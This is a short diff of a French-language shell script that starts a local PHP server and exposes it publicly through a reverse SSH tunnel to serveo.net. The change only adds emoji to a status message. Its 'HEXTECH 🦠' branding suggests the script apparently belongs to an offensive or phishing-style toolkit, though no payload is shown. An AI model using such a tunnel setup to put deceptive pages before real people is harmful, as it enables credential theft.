@@ -11,7 +11,7 @@ demarrer_serveur() {
     echo -e "${BLEU}[•]Démarrage du serveur PHP...${NC}"
     php -S localhost:3000 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
     sleep 2 # Attendre que le serveur démarre
-    echo -e "${JAUNE} HEXTECH 🦠 [*]Connexion à Serveo pour générer un lien public...${NC}"
+    echo -e "${JAUNE} HEXTECH 🦠 [*]Connexion à Serveo pour générer un lien public👇👇...${NC}"
     ssh -R 80:localhost:3000 serveo.net
 }
 
